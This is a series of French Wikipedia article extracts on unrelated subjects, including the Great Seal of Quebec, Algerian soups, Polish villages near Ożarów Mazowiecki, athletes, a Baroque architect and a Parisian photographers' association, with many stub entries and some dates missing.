<doc id="7901103" url="https://fr.wikipedia.org/wiki?curid=7901103" title="Grand Sceau du Québec">
Grand Sceau du Québec

Le Grand Sceau du Québec est le sceau de l'État québécois. Les actes les plus solennels en sont revêtus, notamment les proclamations de convocations de l'Assemblée nationale ou les nominations des ministres, juges des cours provinciales et délégués généraux à l'étranger. Le sceau est utilisé pour authentifier des documents émis par le gouvernement du Quebec au nom du Roi. Il est gardé par le lieutenant-gouverneur, mais est généralement confié à un membre du Conseil exécutif.
Histoire.
Lors de la création du Québec en 1867 par la Confédération canadienne, le sceau utilisé porte les armes du Royaume-Uni, et ce jusqu'au . À ce moment, la reine Victoria du Royaume-Uni octroie des armoiries propres à la province, lesquelles seront affichées sur le Grand Sceau. Le , le gouvernement du Québec renouvelle ses armoiries et le sceau est de nouveau modifié. En 1979, on décide de tronquer les armoiries pour afficher uniquement une fleur de lys issue du drapeau du Québec sur un fond bleu.
Gardien.
Le gardien du sceau est le procureur général du Québec, soit le ministre de la Justice. Son rôle est d'établir et d'autoriser les pièces où le sceau sera apposé. Il est aussi de son rôle de délivrer les lettres patentes.
Depuis le 22 juin 2020, le gardien du Grand Sceau du Québec est Simon Jolin-Barrette.

</doc>
<doc id="7901123" url="https://fr.wikipedia.org/wiki?curid=7901123" title="Midway Interactive">
Midway Interactive



</doc>
<doc id="7901124" url="https://fr.wikipedia.org/wiki?curid=7901124" title="Aliwa tizalfawen">
Aliwa tizalfawen

L'aliwa ou aliwa tizalfawen est un potage traditionnel algérien. C'est une spécialité culinaire touarègue.
Origine.
L’"aliwa tizalfawen" est une spécialité culinaire touarègue, originaire des oasis du Hoggar ("Ahaggar") et du Tassili, régions comprises par les deux "wilayas" actuelles de Tamanrasset et d'Illizi.
Étymologie.
Le nom de ce potage est composé de deux mots en berbère touarègue. "Aliwa" (pluriel "aliwân"), signifie « bouillie » (de farine). "Tizalfawen" est dérivé du verbe "ezlef" qui signifie : « flamber », « brûler », « griller » ; c'est un adjectif qui décrit les gerbes de blé ou d'orge grillés.
En conclusion, le nom du plat, "aliwa tizalfawen", peut être traduit par « bouillie de blé grillé ».
Description.
Il s'agit d'une entrée à base de blé vert ou d'orge grillé (d'où le qualificatif de "tizalfawen") sur du bois d'acacia ou des feuilles de roseau. Les autres ingrédients entrant dans la composition de ce plat sont l'eau, l’oignon, l’ail, l’huile végétale, le sel, le poivre et le beurre de chèvre. 
Pendant la cuisson, la camomille sauvage ("Matricaria pubescens" ou chamomilla pubescens), une plante endémique appelée "aynăsnis"en langue tamahaq est ajoutée pour parfumer la préparation. Le potage est servi chaud.

</doc>
<doc id="7901133" url="https://fr.wikipedia.org/wiki?curid=7901133" title="Bronisze (Mazovie)">
Bronisze (Mazovie)

Bronisze [brɔˈniʂɛ] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 3 kilomètres au sud-est d'Ożarów Mazowiecki (chef-lieu) et à 12 kilomètres à l'ouest de Varsovie.
Le village a une population de 520 habitants en 2009.

</doc>
<doc id="7901135" url="https://fr.wikipedia.org/wiki?curid=7901135" title="Bronisze">
Bronisze



</doc>
<doc id="7901142" url="https://fr.wikipedia.org/wiki?curid=7901142" title="Duchnice">
Duchnice

Duchnice [duxˈnit͡sɛ] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 14 kilomètres à l'ouest du centre de Varsovie.
Le village a une population de 858 habitants en 2009.

</doc>
<doc id="7901148" url="https://fr.wikipedia.org/wiki?curid=7901148" title="Gołaszew">
Gołaszew

Gołaszew [ɡɔˈwaʂɛf] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest d'Ożarów Mazowiecki (chef-lieu) et à l'ouest de Varsovie.
Le village a une population de en 2009.

</doc>
<doc id="7901149" url="https://fr.wikipedia.org/wiki?curid=7901149" title="Williams Interactive Inc.">
Williams Interactive Inc.



</doc>
<doc id="7901150" url="https://fr.wikipedia.org/wiki?curid=7901150" title="Bouktouf">
Bouktouf

Le bouktouf est un velouté traditionnel algérien.
Description.
Le "bouktouf" est préparé avec de l'huile d'olive, des pommes de terre, des courgettes, des tomates, des oignons, puis parfumé au jus de citron et à la coriandre.

</doc>
<doc id="7901151" url="https://fr.wikipedia.org/wiki?curid=7901151" title="Sedum forsterianum">
Sedum forsterianum

Sedum forsterianum est une espèce de plantes succulentes de la famille des Crassulacées.
Habitats.
Rochers siliceux, pelouse sur sols siliceux secs.

</doc>
<doc id="7901152" url="https://fr.wikipedia.org/wiki?curid=7901152" title="Williams Interactive Inc">
Williams Interactive Inc



</doc>
<doc id="7901153" url="https://fr.wikipedia.org/wiki?curid=7901153" title="Williams Interactive Incorporated">
Williams Interactive Incorporated



</doc>
<doc id="7901156" url="https://fr.wikipedia.org/wiki?curid=7901156" title="Midway Interactive Inc.">
Midway Interactive Inc.



</doc>
<doc id="7901157" url="https://fr.wikipedia.org/wiki?curid=7901157" title="Midway Interactive Inc">
Midway Interactive Inc



</doc>
<doc id="7901158" url="https://fr.wikipedia.org/wiki?curid=7901158" title="Midway Interactive Incorporated">
Midway Interactive Incorporated



</doc>
<doc id="7901159" url="https://fr.wikipedia.org/wiki?curid=7901159" title="Fêtes mobiles dans le rite romain">
Fêtes mobiles dans le rite romain



</doc>
<doc id="7901160" url="https://fr.wikipedia.org/wiki?curid=7901160" title="Équipe de Corée du Sud de Coupe Davis">
Équipe de Corée du Sud de Coupe Davis

L'équipe de Corée du Sud de Coupe Davis représente la Corée du Sud à la Coupe Davis.
Historique.
L'équipe prit part pour la première fois à la Coupe Davis en 1960.
La Corée a atteint à trois reprises le du groupe mondial :

</doc>
<doc id="7901161" url="https://fr.wikipedia.org/wiki?curid=7901161" title="Latch (chanson)">
Latch (chanson)

Latch est le premier single issu de l'album "Settle" du duo britannique de musique électronique Disclosure et sorti en 2013. Il est chanté par Sam Smith.

</doc>
<doc id="7901163" url="https://fr.wikipedia.org/wiki?curid=7901163" title="Fêtes mobiles dans le rite byzantin">
Fêtes mobiles dans le rite byzantin

À la fête de Pâques, moment central du culte chrétien, sont associées de nombreuses fêtes mobiles. Plusieurs des fêtes liées à Pâques sont communes à l'Église romaine et aux Églises d'Orient (avec des dates différentes dues aux différences de calendriers), mais de nombreuses autres sont propres à chaque rituel.
Les fêtes liées à Pâques dans le rite byzantin.
Les Églises d'Orient – Églises orthodoxes et Églises catholiques de rite byzantin – suivent le calendrier julien pour ce qui concerne les fêtes mobiles liées à Pâques. Les dates relatives à Pâques sont à considérer en calendrier julien.
Le jour de Pâques est noté P. P - 1 désigne le jour précédent, c'est-à-dire le Samedi saint, etc.

</doc>
<doc id="7901170" url="https://fr.wikipedia.org/wiki?curid=7901170" title="Shinsuke Kashiwagi">
Shinsuke Kashiwagi

, né le , à Hokkaidō, au Japon, est un joueur japonais de basket-ball. Il évolue au poste de meneur. 

</doc>
<doc id="7901172" url="https://fr.wikipedia.org/wiki?curid=7901172" title="Chang Eun-kyung">
Chang Eun-kyung

Chang Eun-Kyung (né le et mort le ) est un judoka sud-coréen. Il participe aux Jeux olympiques d'été de 1976 dans la catégorie des poids légers et remporte la médaille d'argent.

</doc>
<doc id="7901179" url="https://fr.wikipedia.org/wiki?curid=7901179" title="Takehiko Orimo">
Takehiko Orimo

, né le , à Ageo, au Japon, est un joueur japonais de basket-ball. Il évolue au poste d'arrière. 

</doc>
<doc id="7901183" url="https://fr.wikipedia.org/wiki?curid=7901183" title="Projet du gaz du sud tunisien">
Projet du gaz du sud tunisien



</doc>
<doc id="7901186" url="https://fr.wikipedia.org/wiki?curid=7901186" title="Castle Craig Hospital">
Castle Craig Hospital

Castle Craig Hospital est une clinique pour le traitement des addictions à l'alcool et aux drogues située dans le Peeblesshire, en Écosse. C'est le plus grand centre hospitalier de traitement des addictions au Royaume-Uni. Depuis sa fondation en 1988, plus de y ont été traités. Il est basé dans un parc privé qui s'étend sur , près de la ville de Peebles.
Castle Craig est certifié Moody ISO 9001 : 2008 (Systèmes de management de la qualité-Exigence). Cette certification contrôle les soins médicaux, les infirmiers et les procédures administratives, qui font l'objet d'audits réguliers.
Programme thérapeutique.
Le traitement est basé sur le rétablissement en suivant un , qui vise l'abstinence et qui reconnaît la toxicomanie comme étant une maladie dont les patients peuvent se remettre. L'abstinence sur le longue terme est essentielle pour une récupération de longue durée. Le programme de traitement à Castle Craig est dirigé par un directeur médical et par un psychiatre consultant, qui développent pour chaque patient un plan de traitement médical personnalisé, un plan de thérapie psychiatrique et des thérapies complémentaires.
Castle Craig est l'un des principaux sous-traitants du Service National de la santé NSH et est reconnu par les compagnies d'assurance majeures au Royaume-Uni . De nombreuses compagnies d'assurance basées dans d'autres pays financent également le coût du traitement. Castle Craig est reconnu par le système national de santé hollandais.
Historique.
Le bâtiment dans lequel l'hôpital est installé, et qui lui a donné son nom, le «  » est un monument classé de catégorie B (comme étant d'importance régionale). Il a été construit il y a plus de deux cents ans par le comte de Hyndford, le chef du clan Carmichael. La première mention du bâtiment date du 1170. Les fondateurs de Castle Craig Hospital, Peter McCann et Margaret Ann McCann ont fondé le centre de traitement en 1988 et dirigent encore la clinique aujourd'hui.

</doc>
<doc id="7901190" url="https://fr.wikipedia.org/wiki?curid=7901190" title="Roger Michel Erasmy">
Roger Michel Erasmy

Roger Michel Erasmy, né le à Luxembourg et mort le à Jurançon, est un auteur spécialiste de Salvador Dalí. Il s'est fait connaître par l'ouvrage "Codex Dalianus".
Biographie.
Roger Michel Erasmy est directeur commercial avant de devenir secrétaire au service d'expansion économique de l'ambassade de France au Luxembourg. Dans le "Who's Who", il est mentionné que Roger Michel Erasmy est chevalier de l'Ordre du Mérite A.D.N Luxembourg en 1972. Il est organisateur du Festival du livre de Salies-du-Salat (Haute-Garonne) de 1989 à 1990, directeur de la publication "Petit Courrier Culturel Abrégé". Depuis 1995, Roger Erasmy organise des voyages de la découverte sur la route dalinienne de la région espagnole Empordà-Costa Brava. Ses origines, comme également son expérience des dossiers communautaires, expliquent sa parfaite connaissance des questions européennes qui figurent dans ses écrits révélateurs, lesquels font de lui un décodeur de l'œuvre de Salvador Dalí. En débarquant en 1982 à la gare de Perpignan, Erasmy pense avoir découvert les codes de la méthode paranoïaque-critique de Dalí. Depuis 1984, Erasmy a décortiqué l'œuvre pictural de l'artiste et exploré les hauts lieux de sa créativité. Erasmy pense avoir compris que les visions délirantes de Dalí correspondent à un stupéfiant réalisme géopolitique. Son premier livre, intitulé "Le Mystère de la gare de Perpignan", paru en 1985, cherche à établir les certitudes du peintre catalan. En 1989, la publication du "Codex Dalianus" tente de faire la démonstration de la vocation messianique du génial artiste. Vingt-sept années d'investigations systématiques en Catalogne essayent d'accumuler les preuves que les troublantes peintures du maître du surréalisme constituent un invraisemblable scénario du futur.
Œuvres littéraires.
Depuis 1984, toutes les activités de Roger Michel Erasmy sont orchestrées autour de ses théories relatives aux sources du génie de Salvador Dalí. La publication de cinq livres révélateurs dans la série « Codex Dalianus » (Dalí décodé) a été complétée par un cycle de conférences, données essentiellement dans les villes de Nice, Toulouse, Barcelone, Luxembourg, Perpignan, Menton, Foix, Marseille. L’édition d’ouvrages consacrés à Salvador Dalí a été doublée en 1992 par la publication d'un guide olympique à l'occasion des Jeux olympiques d'été de 1992 à Barcelone.
Thèmes.
Depuis le début du , les événements tragiques survenus à New York, à Bagdad et plus récemment en Afrique du Nord semblent confirmer le délire prophétique de Dalí. La terrible crise financière de 2008 renvoie aux projections de "L'apothéose du Dollar". Les interprétations d'Erasmy cherchent une caution dans les réalités de l'histoire contemporaine. Dali aurait compris avant tout le monde que le destin de l'humanité allait basculer au début du troisième millénaire.
Activités daliniennes.
Erasmy est au cœur de projets événementiels autour de Dalí : 

</doc>
<doc id="7901191" url="https://fr.wikipedia.org/wiki?curid=7901191" title="Joseph Emanuel Fischer von Erlach">
Joseph Emanuel Fischer von Erlach

Joseph Emanuel Fischer von Erlach (baptisé le à Vienne, mort le dans la même ville) est un architecte autrichien baroque.
Biographie.
Second fils de l'architecte Johann Bernhard Fischer von Erlach, il développe son talent dans son atelier. En 1711, il dessine les projets de son père (comme le Palais Lobkowitz, le Palais Trautson, la , le ) et l'aide dans la rédaction d'un "Plan d'une architecture historique" en quatre volumes. Il apprend ainsi l'architecture classique et moderne.
Il reçoit l'instruction de Gottfried Wilhelm Leibniz, qui travaille avec son père jusqu'en 1714. Les deux obtiennent une bourse de Charles VI du Saint-Empire pour lui financer un voyage d'étude. En 1713 et 1714, il va en Italie et fait la connaissance de l'archéologue Francesco de Ficoroni. Entre 1717 et 1719, il est en France et rencontre le maître d'œuvre Robert de Cotte, l'architecte Germain Boffrand et le philologue Bernard de Montfaucon. De même, il est présent à Londres et à Leyde, où il découvre les nouvelles machines à vapeur et rencontre aussi Isaac Newton. L'ingénieur l'accompagne lors de son retour en Autriche.
Il revient à Vienne en 1722 et est fait architecte de la cour. Après la mort de son père en 1723, Lukas von Hildebrandt devient le premier architecte ; en 1725, grâce à l'appui de son puissant mécène , Joseph Emanuel récupère les travaux de son père pour les terminer comme l'église Saint-Charles-Borromée, la Hofbibliothek et la . Dans le cadre de son travail, il se consacre de plus en plus à mettre au point des machines à vapeur.
En 1727, il épouse Anna von Dietrich qui lui donnera quatre enfants. Il monte une importante collection d'art et une bibliothèque.
Il est l'architecte de la cathédrale Saint-Georges de Timișoara (aujourd'hui en Roumanie).
Sa femme meurt en 1740 et lui en 1742 après une forte fièvre. Il laisse une grande fortune de florins.
Après sa mort, ses plans de la Michaelerplatz sont réalisés entre 1889 et 1893 par Ferdinand Kirschner qui les modifie pour intégrer le Burgtheater. De même, d'après ses plans, Georg Christian Unger réalise l'Alte Bibliothek de Berlin entre 1775 et 1780.
Peu d'œuvres clairement de la main de Joseph Emanuel Fischer von Erlach subsistent. Ont disparu le , le corps de logis du château d'Eckartsau, le .

</doc>
<doc id="7901199" url="https://fr.wikipedia.org/wiki?curid=7901199" title="Championnat du Yémen de football 2007">
Championnat du Yémen de football 2007

La saison 2007 du Championnat du Yémen de football est la quinzième édition de la première division au Yémen. Quatorze formations sont rassemblées au sein d'une poule unique et s'affrontent deux fois au cours de la saison, à domicile et à l'extérieur. Les quatre derniers sont relégués et remplacés par les quatre meilleurs clubs de "Division 1", la deuxième division yéménite.
C’est Al Ahli Sanaa qui remporte la compétition cette saison après avoir terminé en tête du classement final, avec trois points d'avance sur Hassan Abyan et cinq sur le tenant du titre, Al Saqr Ta'izz. Il s’agit du dixième titre de champion du Yémen de l’histoire du club.
Compétition.
Le barème de points servant à établir le classement se décompose ainsi :
Matchs.
Barrage de relégation.
Ayant terminé ex æquo à la du classement, synonyme de maintien en première division, Al-Tilal SC et Al Wehda Sana'a doivent disputer un match d’appui afin de déterminer l’équipe reléguée en ‘’Division 1’’.

</doc>
<doc id="7901200" url="https://fr.wikipedia.org/wiki?curid=7901200" title="Guy III de Saint-Pol">
Guy III de Saint-Pol



</doc>
<doc id="7901201" url="https://fr.wikipedia.org/wiki?curid=7901201" title="Muzio Manfredi">
Muzio Manfredi

Muzio Manfredi (Cesena, vers - Rome, ) est un poète et un dramaturge italien actif au .
Biographie.
Né dans une famille noble de Faenza, il termine ses études à Ravenne. En 1552, il part à Rome pour participer à plusieurs résidences de la noblesse romaine, il y reste plus de vingt ans. En 1575, il part à Bologne et publie une thèse sur la "Lettione" (un sonnet de Galeazzo Rossi). La même année, il publie "Per donne romane" un anthologie de poèmes d'auteurs variés.
On ne connaît pas la durée exacte de son séjour à Bologne, mais en 1580 il est à Parme où il est membre de l'académie de Nameless. C'est durant cette période qu'il écrit sa première pièce, la tragédie "Semiramis" qui malgré de nombreux essais n'a jamais été représentée durant la vie de Manfredi.
En 1582, il est à Ferrare où il assiste à une représentation de "Concerto delle donne" réservée uniquement à l'époque aux membres de la cour d'Alphonse II d'Este.

</doc>
<doc id="7901203" url="https://fr.wikipedia.org/wiki?curid=7901203" title="Masse propre">
Masse propre



</doc>
<doc id="7901211" url="https://fr.wikipedia.org/wiki?curid=7901211" title="Shayk">
Shayk



</doc>
<doc id="7901214" url="https://fr.wikipedia.org/wiki?curid=7901214" title="Élections municipales de 1971 à Marseille">
Élections municipales de 1971 à Marseille

Des élections municipales ont lieu à Marseille les 14 et .
Gaston Defferre, maire de Marseille depuis 1953, est réélu pour un quatrième mandat à la tête d'une majorité qui allie socialistes et modérés de la droite non-gaulliste face à Georges Lazzarino du PCF, et Joseph Comiti, gaulliste.
Mode de scrutin.
Depuis 1965, les conseillers municipaux au scrutin de liste majoritaire dans le cadre de huit secteurs : la liste gagnante remporte la totalité des sièges du secteur. Pour l'emporter, une liste doit recueillir la majorité absolue des suffrages exprimés au premier tour ou la majorité relative au second.
Candidats.
Gaston Defferre.
Gaston Defferre est maire de Marseille depuis 1953, à la tête d'une coalition de socialistes et modérés. Il se représente en 1971 à la tête de listes qui comptent, en plus de socialistes, des membres du Centre démocrate, du Parti radical, de la Convention des institutions républicaines et des sans étiquette. Les socialistes qui, en 1965, avaient fait dissidence pour se présenter avec les communistes sont cette fois fidèles au Parti socialiste.
Georges Lazzarino.
En 1965, les communistes se sont présentés face à Gaston Defferre en sein d'une comprenant des socialistes dissidents refusant l'alliance avec la droite.
En 1971, ils se présentent cette fois seuls sous la candidature de Georges Lazzarino.
Joseph Comiti.
Comme en 1965, Joseph Comiti (alors secrétaire d'État à la Jeunesse et aux Sports) prend la tête des listes du parti gaulliste.
Résultats.
Les résultats sont une victoire pour Gaston Defferre, largement réélu. Les gaullistes augmentent leur score alors que les communistes sont en net recul, même s'ils parviennent à gagner le secteur dès le premier tour.

</doc>
<doc id="7901221" url="https://fr.wikipedia.org/wiki?curid=7901221" title="József Tuncsik">
József Tuncsik

Jozsef Tuncsik (né le ) est un judoka hongrois. Il participe aux Jeux olympiques d'été de 1976 en combattant dans la catégorie des poids moyens. Il y remporte la médaille de bronze.

</doc>
<doc id="7901225" url="https://fr.wikipedia.org/wiki?curid=7901225" title="Faune aux enfants">
Faune aux enfants

Le Faune aux enfants est une statue de Yvonne Serruys datée de 1911.
Localisation.
La statue est située Place Jan-Karski, sur le trottoir de la rue Louis-Blanc surplombant les voies de chemin de fer de la gare de Paris-Est. Elle est adossée au mur du lycée Colbert, et entourée d'un jardinet.
Description.
La statue représente un faune assis, jouant avec trois enfants. Un enfant est assis sur la cuisse gauche du faune, un enfant est agenouillé au sol à droite du faune, un troisième, dans le dos du faune, lui pose les mains sur le visage (front et joue).
Histoire.
La statue est datée de 1911, elle a été exposée au Salon de la Société nationale des beaux-arts de 1911.

</doc>
<doc id="7901228" url="https://fr.wikipedia.org/wiki?curid=7901228" title="Union photographique française">
Union photographique française

L'Union photographique française est une association ouvrière de photographes, active de 1893 à 1920, qui a produit un corpus photographique similaire à celui de son contemporain Eugène Atget en documentant les rues, immeubles et vitrines à Paris. Vivant de commandes publiques destinées à préserver la mémoire de lieux sur le point de disparaitre à la suite d'opérations d'urbanisme, elle est l'héritière de Charles Marville et Pierre Emonds.
L'association se caractérise par l'effacement total de ses photographes derrière le nom d'UPF. Ses statuts précisaient que « tout sociétaire doit se conformer strictement aux statuts et règlement de la Société, effacer en toute circonstance sa personnalité devant l'intérêt général, travailler et apporter tous les soins pour atteindre le but que propose la Société ».
Histoire.
L'Union photographique française est une association ouvrière, créée le par un groupe de dix-neuf personnes (photographes, tireurs, retoucheurs, tous actionnaires). L'association travaille avec la Commission du Vieux Paris et le musée Carnavalet jusqu'en 1912. Elle est dissoute le .
Le fonds UPF du musée Carnavalet est constituée de plus de 1000 clichés.
Photographes connus pour avoir travaillé dans le cadre de l'UPF : Gustave Van Rooy, Jean-Baptiste Laroche, Auguste Thiebault, Auguste Lalbrun, Pétrus Montroché, Maurice Dubois, Adrien Chaupe, Gédéon Warchasky.
L'Union photographique française est domiciliée après-guerre dans les locaux de l'agence de presse du PCF, l'Union Française d'information, au rue du Quatre-Septembre à Paris.

</doc>
<doc id="7901235" url="https://fr.wikipedia.org/wiki?curid=7901235" title="Jawczyce (Mazovie)">
Jawczyce (Mazovie)

Jawczyce [jafˈt͡ʂɨt͡sɛ] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 5 kilomètres à l'est d'Ożarów Mazowiecki (chef-lieu) et à 10 kilomètres à l'ouest de Varsovie.
Le village a une population de 226 habitants en 2009.

</doc>
<doc id="7901255" url="https://fr.wikipedia.org/wiki?curid=7901255" title="Île Leigh-Smith">
Île Leigh-Smith

L'île Leigh-Smith (en ) est une île de la terre François-Joseph, en Russie.
Géographie.
D'une superficie de , située à à l'est de l'île Hooker dont elle est séparée par le canal Smithson, elle culmine à . À sa pointe nord, nommée cap Rose, se dresse aussi un imposant rocher (). D'une longueur de sur une largeur de , son cap sud porte le nom de cap Wittenburg. Elle est entièrement recouverte par une calotte glaciaire (93 % de l'île). Le détroit de Sidorov la sépare de l'île Brady à à l'ouest et le détroit de Young des îles Pritchett, Zub et Bliss au nord-ouest.
Histoire.
Découverte par Fridtjof Nansen en 1896, elle a été nommée en l'honneur de l'explorateur Benjamin Leigh Smith. Walter Wellman cartographie l'île en 1899 et Anthony Fiala en 1903, la nomme île Jackson, nom qui sera finalement attribué à une autre île. 

</doc>
<doc id="7901260" url="https://fr.wikipedia.org/wiki?curid=7901260" title="Jawczyce">
Jawczyce



</doc>
<doc id="7901263" url="https://fr.wikipedia.org/wiki?curid=7901263" title="Record du monde du 100 mètres (athlétisme)">
Record du monde du 100 mètres (athlétisme)



</doc>
<doc id="7901267" url="https://fr.wikipedia.org/wiki?curid=7901267" title="Record du monde du 200 mètres (athlétisme)">
Record du monde du 200 mètres (athlétisme)



</doc>
<doc id="7901271" url="https://fr.wikipedia.org/wiki?curid=7901271" title="Record du monde du 400 mètres (athlétisme)">
Record du monde du 400 mètres (athlétisme)



</doc>
<doc id="7901274" url="https://fr.wikipedia.org/wiki?curid=7901274" title="Record du monde du 800 mètres (athlétisme)">
Record du monde du 800 mètres (athlétisme)



</doc>
<doc id="7901278" url="https://fr.wikipedia.org/wiki?curid=7901278" title="Fitz and The Tantrums">
Fitz and The Tantrums

Fitz and The Tantrums est un groupe de neo soul américain formé en 2008 à Los Angeles.

</doc>
<doc id="7901281" url="https://fr.wikipedia.org/wiki?curid=7901281" title="Michel Étienne Lenoir de La Cochetière">
Michel Étienne Lenoir de La Cochetière

Michel Étienne François Lenoir de la Cochetière, né le à Le Lude (Sarthe), mort en à Paris, est un général de brigade de la Révolution française.
États de service.
Il entre en service le , à la compagnie des gendarmes écossais, et il quitte l'uniforme le . Retiré du service le , il entre dans la garde nationale de Château-du-Loir à la formation en .
Le , il est élu lieutenant colonel du de volontaires de la Sarthe, et il sert à l’armée du Nord. Le , il est fait prisonnier lors de la défense de la redoute de la forêt de Mormal près de Maubeuge.
Il est promu général de brigade le , et il est libéré de captivité en septembre suivant. Il est envoyé à l’armée de l’Ouest, puis à celle de Brest, pour participer aux guerres de l’Ouest en 1793 et 1794. Le , il commande la militaire à Orléans, et le suivant, il est relevé de ses fonctions, à la suite de la réforme de l’état-major de l’armée de l’Ouest.
Le , il est remis en activité, et le suivant il reprend du service comme chef de bataillon. Il est réformé le , et il se serait probablement suicidé dans le bois de Boulogne à Paris en .

</doc>
<doc id="7901282" url="https://fr.wikipedia.org/wiki?curid=7901282" title="Kaputy">
Kaputy

Kaputy [kaˈputɨ] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 2 kilomètres au nord-ouest d'Ożarów Mazowiecki (chef-lieu) et à 15 kilomètres à l'ouest de Varsovie.
Le village a une population de 256 habitants en 2009.

</doc>
<doc id="7901286" url="https://fr.wikipedia.org/wiki?curid=7901286" title="Konotopa (Varsovie-ouest)">
Konotopa (Varsovie-ouest)

Konotopa [kɔnɔˈtɔpa] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 3 kilomètres au sud-est d'Ożarów Mazowiecki (chef-lieu) et à 13 kilomètres à l'ouest de Varsovie.
Le village a une population de 281 habitants en 2009.

</doc>
<doc id="7901288" url="https://fr.wikipedia.org/wiki?curid=7901288" title="Just Legal">
Just Legal

 est une série télévisée américaine en huit épisodes de 45 minutes, créée par dont seulement trois épisodes ont été diffusés entre le et le sur The WB. La série complète a été diffusée en sur le même réseau.
En France, le premier épisode a été diffusé le sur Série Club dans les ". Elle reste inédite dans les autres pays francophones.
Production.
Le projet de débute en . Le pilote est commandé début sous le titre ". Le casting débute le mois suivant avec Jay Baruchel, suivi en mars par Don Johnson. Amy Aquino est invitée dans le pilote dans le rôle d'une juge.
La série est commandée à la mi-mai lors des Upfronts. Jaime Lee Kirchner rejoint la série en juillet.
Pourtant diffusée les lundis après "Sept à la maison" ('), la série perd plus de la moitié de son audience et fini dernière parmi les six réseaux (battu par ' et " sur UPN), et a été annulée après trois épisodes.

</doc>
<doc id="7901289" url="https://fr.wikipedia.org/wiki?curid=7901289" title="Koprki">
Koprki

Koprki [ˈkɔprki] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 5 kilomètres à l'ouest d'Ożarów Mazowiecki (chef-lieu) et à 19 kilomètres à l'ouest de Varsovie.
Le village a une population de 157 habitants en 2009.

</doc>
<doc id="7901296" url="https://fr.wikipedia.org/wiki?curid=7901296" title="Ravdangiin Davaadalai">
Ravdangiin Davaadalai

Ravdangiin Davaadalai (né le ) est un judoka mongol. Il participe aux Jeux olympiques d'été de 1980 en combattant dans la catégorie des poids légers et remporte la médaille de bronze.

</doc>
<doc id="7901297" url="https://fr.wikipedia.org/wiki?curid=7901297" title="Kręczki">
Kręczki

Kręczki [ˈkrɛnt͡ʂki] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 3 kilomètres au nord-ouest d'Ożarów Mazowiecki (chef-lieu) et à 15 kilomètres à l'ouest de Varsovie.
Le village a une population de 256 habitants en 2009.

</doc>
<doc id="7901304" url="https://fr.wikipedia.org/wiki?curid=7901304" title="Macierzysz">
Macierzysz

Macierzysz [maˈt͡ɕeʐɨʂ] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 5 kilomètres à l'est d'Ożarów Mazowiecki (chef-lieu) et à 10 kilomètres à l'ouest de Varsovie.
Le village a une population de 490 habitants en 2009.

</doc>
<doc id="7901305" url="https://fr.wikipedia.org/wiki?curid=7901305" title="Michałówek (Varsovie-ouest)">
Michałówek (Varsovie-ouest)

Michałówek [mixaˈwuvɛk] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 6 kilomètres à l'ouest d'Ożarów Mazowiecki (chef-lieu) et à 19 kilomètres à l'ouest de Varsovie.
Le village a une population de 45 habitants en 2009.

</doc>
<doc id="7901310" url="https://fr.wikipedia.org/wiki?curid=7901310" title="Lohme">
Lohme

Lohme est une commune sur l'île de Rügen, dans l'arrondissement de Poméranie-Occidentale-Rügen, Land de Mecklembourg-Poméranie-Occidentale.
Géographie.
L'ancien port de Lohme se trouve au pied des falaises hautes de 50 mètres au nord de la péninsule de Jasmund, en-dessous de la forêt de Stubnitz. Le port est recréé en 1906 et rénové en 1997 est accessible par un escalier pentu.
La commune de Lohme est composée des quartiers de Blandow, Hagen, Lohme, Nardevitz, Nipmerow, Ranzow et Bisdamitz.
Histoire.
Le territoire de Lohme est habité dès le Néolithique, vers av. J-C. Des tombes mégalithiques sont découvertes près de Nipmerow en 1983. On trouve un grand nombre de tumulus de l'âge du bronze à Lohme et Nipmerow.
Par la suite, les premières traces de colonisation slave datent de 800. Le nom de Lohme vient du vieux-slave lomŭ, soit "cassure", "brise-vent" ou "carrière".
L'activité balnéaire se développe à partir de 1884 et de la construction de la ligne de chemin de fer vers Bergen en Rügen et Sassnitz.
Dans la nuit du 26 au 27 février 1900, le bateau "Rex", qui assure la liaison entre Sassnitz et Trelleborg, s'échoue sur la plage de Blandow. Cinq femmes se noient lors de l'évacuation. Trois jours plus tard, le navire sa casse avec la force des vagues.
À la fin des années 1990, le phare de Ranzow et l'émetteur de Rügen Radio cessent leurs activités.
Le 19 mars 2005, un important éboulement de la falaise oblige à la fermeture de bâtiments à proximité du nouveau bord et à des travaux de consolidation de la falaise.

</doc>
<doc id="7901312" url="https://fr.wikipedia.org/wiki?curid=7901312" title="Mory (Varsovie-ouest)">
Mory (Varsovie-ouest)

Mory [ˈmɔrɨ] est un village polonais, situé dans la gmina d'Ożarów Mazowiecki de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 5 kilomètres à l'est d'Ożarów Mazowiecki (chef-lieu) et à 10 kilomètres à l'ouest de Varsovie.
Le village a une population de 126 habitants en 2009.

</doc>
<doc id="7901313" url="https://fr.wikipedia.org/wiki?curid=7901313" title="Kōsuke Takeuchi">
Kōsuke Takeuchi

